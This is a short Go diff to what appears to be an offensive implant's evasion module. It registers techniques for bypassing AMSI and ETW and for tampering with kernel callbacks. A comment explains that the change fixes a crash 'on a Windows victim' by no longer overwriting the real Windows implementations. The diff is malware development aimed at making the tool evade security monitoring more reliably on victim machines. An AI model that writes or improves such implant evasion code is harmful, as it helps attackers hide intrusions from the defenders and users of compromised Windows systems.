@@ -356,11 +356,20 @@ func init() {
 	registerEvasion("protect_process", wrap(handleProtectProcess))
 	registerEvasion("amsi_hardware_bp", wrap(handleAMSIHardwareBP))
 	registerEvasion("etw_hardware_bp", wrap(handleETWHardwareBP))
-	registerEvasion("kernel_callback", wrap(handleEvasionKernelCallback))
-	registerEvasion("etwti", wrap(handleEvasionETWTI))
-	registerEvasion("enum_callbacks", wrap(handleEvasionEnumCallbacks))
-	registerEvasion("objcb", wrap(handleEvasionObjCB))
-	registerEvasion("imgload", wrap(handleEvasionImgLoad))
+	// The kernel-level techniques are registered only on non-Windows builds.
+	// The real implementations live in evasion_*_windows.go and register
+	// themselves; re-registering them here would overwrite those real entries
+	// with wrap(handleEvasion*) — and since handleEvasion* dispatch through
+	// runEvasion(name), that produces infinite recursion (stack overflow) on a
+	// Windows victim. On non-Windows the wrapper is kept so run_evasion reports
+	// the same "Windows-only" error as the direct task types.
+	if runtime.GOOS != "windows" {
+		registerEvasion("kernel_callback", wrap(handleEvasionKernelCallback))
+		registerEvasion("etwti", wrap(handleEvasionETWTI))
+		registerEvasion("enum_callbacks", wrap(handleEvasionEnumCallbacks))
+		registerEvasion("objcb", wrap(handleEvasionObjCB))
+		registerEvasion("imgload", wrap(handleEvasionImgLoad))
+	}
 }
 
 // Unified evasion handler - runs any registered technique by name
